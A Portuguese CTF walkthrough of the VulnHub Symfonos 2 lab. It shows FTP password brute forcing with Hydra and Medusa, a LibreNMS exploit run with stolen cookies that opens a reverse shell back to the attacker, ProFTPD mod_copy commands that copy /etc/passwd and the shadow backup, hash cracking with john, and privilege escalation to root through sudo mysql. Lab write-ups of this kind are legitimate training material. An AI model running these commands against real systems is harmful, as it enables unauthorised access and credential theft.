---
title: "VulnHub - Symfonos 2"
tags: [Linux,Medium,Gobuster,Smbclient,Enum4linux,Chisel,PortForwading,ProFTPD 1.3.5, Hydra, Medusa, Socat, LibreNMS, MySQL, GTFOBINS, John]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/inicial.png)

Link: <https://www.vulnhub.com/entry/symfonos-2,331/>

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.100/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 5 portas abertas no servidor

> Porta 21 - Servidor FTP

> Porta 22 -> Servidor SSH

> Porta 80 -> Servidor Web

> Portas 139 e 445 -> Servidor SMB

## Enumeração da Porta 80 (Web)

Abrimos ela no navegador pra se tem algo de interessante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/web.png)

Vamos rodar o gobuster também

```bash
gobuster dir -u http://192.168.56.106/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/web1.png)

Nada... vamos prosseguir...

## Enumeração da Porta 445

Bom, sabendo que é um servidor samba, vamos ver se tem algum share disponível

```bash
smbclient -L \\192.168.56.106
```

Apareceu um **anonymous** ali, interessante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/smb.png)

Entamos nele

```bash
smbclient //192.168.56.106/anonymous
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/smb1.png)

Passamos esse arquivo **log.txt** para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/smb2.png)

Verificamos que é um arquivo de configuração

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/smb3.png)

Algumas coisas são interessantes de se notar

Logo no início ele move o conteúdo do **shadow** para um backup, e da um cat nas configurações do samba, que é esse arquivo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/smb4.png)

Tem uma senha de um possível banco de dados... vamos guardar ela caso seja útil depois

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/smb5.png)

E aparece esse usuário **aeolus**, possivelmente é da máquina também

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/smb6.png)

Próximo passo é rodar o enum4linux

```bash
enum4linux 192.168.56.106
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/enum4linux.png)

Encontramos dois usuário... interessante... **aeolus** e **cronus**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/enum4linux1.png)

Pelo servidor samba creio que já enumeramos bastante... vamos para o FTP agora

## Enumeração da Porta 21

Porta 21, geralmente roda servidor FTP por padrão

Vamos pesquisar por vulnerabilidades para o **ProFTPD 1.3.5 Server** que é o que está sendo executado nele

Encontramos... mas vamos deixar a exploração dele por aqui para a seção **Algo a mais** no final do post

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/ftp1.png)

Tentamos login anonimo, ele não deixou

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/ftp.png)

Vamoss tentar um brute force nela então... com aquele usuário que encontramos, já que não temos muito mais o que fazer aqui

Aqui vou deixar com uma wordlist pequena por que é demonstração...

Pelo **Hydra**

```bash
hydra -l aeolus -P senhas.txt ftp://192.168.56.106
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/hydra.png)

Pelo **Medusa**

```bash
medusa -h 192.168.56.106 -u aeolus -P senhas.txt -M ftp
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/medusa.png)

Beleza! Encontramos uma senha... **aeolus:sergioteamo**

Logamos no ftp, mas não tem nada de interessante... haha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/ftp2.png)

## Enumeração da Porta 22

Bom, por ser ssh, pode ser que esse usuário aeolus seja um usuário válido para fazermos uma conexão ssh, então vamos tentar

Deu certo!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/ssh.png)

Então agora vamos iniciar a escalação de privilégio

# Aeolus -> Cronus

Primeiro passo que sempre faço nessas situações é rodar o `linpeas`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/linpeas.png)

Passamos ele para a nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/linpeas1.png)

Agora executamos no host

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/linpeas2.png)

Bom, não encontramos muita coisa com o script, a unica coisa que chamou atenção foi o **nmap** nativo nela, coisa que não é comum em máquinas e versão do kernel um pouco desatualizada, então depois vamos tentar fazer algum tipo de escalação de privilégio pelo kernel

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/linpeas3.png)

## Descobrindo porta 8080

Dando um nmap no localhost descobrimos que o servidor está executando um página web na porta 8080 (estranho não ter aparecido no linpeas isso), o resto das portas são padrão que já sabiamos que tinha no servidor.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/linpeas4.png)

## Port Forwading

Então... vamos precisar fazer um port forwading agora dessa porta 8080 para outra porta, pra podermos acessar ela no nosso host e ver do que se trata essa 
página web

Temos vários modos de se fazer isso, vou demonstrar alguns

### Socat

Podemos fazer isso através do socat

```bash
socat TCP-LISTEN:5000,fork,reuseaddr tcp:127.0.0.1:8080
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/socat.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/socat1.png)

### SSH

Através do ssh

```bash
ssh -L 8080:localhost:8080 aeolus@192.168.56.106
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/portssh.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/portssh1.png)

### Chisel

E através do [Chisel](https://github.com/jpillora/chisel)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/chisel.png)

Passamos pra máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/down.png)

Servidor e Cliente

```bash
# Servidor
/chisel server --host 192.168.56.102 --port 8000 --reverse
# Cliente
/chisel client 192.168.56.102:8000 R:5000:127.0.0.1:8080
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/chisel1.png)

Página Web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/portssh1.png)

Agora vamos prosseguir

## LibreNMS

Agora que sabemos que a aplicação que está sendo executada é a LibreNMS, vamos procurar por exploits para ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/libre.png)

Verificamos como ela funciona

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/libre1.png)

Logamos na aplicação com o usuário **aeolus:sergioteamo**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/libre2.png)

Pegamos os cookies

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/libre3.png)

Executamos o exploit

```bash
python 47044.py http://127.0.0.1:5000 "librenms_session=eyJpdiI6IlZLNVhKOFwvZVBydlZrdFRLRVh1NStBPT0iLCJ2YWx1ZSI6Ik9LVFJaeFFuQWFNWVRSdldDQ3ZSWGwxcW8xMlRzbG13XC9XUG5ZXC81dzBhNkJiU1JlbmE1dVU3MHdWYmMyTUNqS1ZqanhyeTh0bTRqN3NQTTlFc3BpM2c9PSIsIm1hYyI6ImFiZmQ1NGM5Yzg5ZDNhZDFiYzNhNjBjMmE5ZWVmNzkwMjcyN2MyYzA3ZTFlYzQ4MDkxZGQ5MWEzODExNDdlMTMifQ%3D%3D; XSRF-TOKEN=eyJpdiI6IjUzSUdQdmhQY0FhU3JXYXlvR0YxekE9PSIsInZhbHVlIjoiTWZzN2YxazZDa2pBaG1mMmtvRnI4K05lMDlVbWRCMXJORnM0aFJRd2cwOStUallCbmw3S1NMVXU2SzU4QnRaVUJjUG01cGdIbENndnlrUzR5OFFsbkE9PSIsIm1hYyI6IjZjYTNkMzViNDVmZDM1ZGUzOTBmYmM4YjBjMDJmMTJlMmQxNTU0ZDVhZWEwNTdiNWQ5YTJkMWVhNzkwNjY5NjAifQ%3D%3D; PHPSESSID=0jcldumm7q6cm7igv4vgk67lq2" 192.168.56.102 443
```

Pegamos um shell de **cronus**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/libre4.png)

Agora vamos iniciar a escalação de privilégio para root

# Cronus -> Root

Aqui é simples, rodamos o comando **sudo -l** e vemos que o usuário cronus pode rodar o mysql como root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/libre5.png)

Verificamos no [Gtfobins](https://gtfobins.github.io/gtfobins/mysql/) como podemos abusar disso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/libre6.png)

E viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/libre7.png)

## Flag

Pegamos a flag!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/flag.png)

# Algo a Mais

Agora vamos verificar novas possibilidades nessa máquina

## Exploração ProFTPD 1.3.5 Server

Encontramos...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/ftp1.png)

Basicamente a explicação desse exploit é que podemos copiar arquvios via ftp e acessar eles através de outras fontes, no nosso caso do smb

Então vamos testar isso

Mostrando no smbclient que não há arquivos ali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/pro.png)

Verificamos naquele arquivo **log.txt** o local do share do usuário **aeolous**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/pro5.png)

Agora pelo ftp vamos copiar o **passwd** e **shadow**

```bash
ftp 192.168.56.106
ftp> site cpfr /var/backups/shadow.bak
ftp> site cpto /home/aeolus/share/shadow.txt
ftp> site cpfr /etc/passwd
ftp> site cpto /home/aeolus/share/passwd.txt
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/pro1.png)

Baixamos os dois

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/pro2.png)

Agora fazemos o **unshadow** deles

```bash
unshadow passwd.txt shadow.txt > senhas.txt
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/pro3.png)

Agora com o john quebramos esses hashes

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt senhas.txt
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos2/pro4.png)

A partir daqui é igual foi feito lá em cima...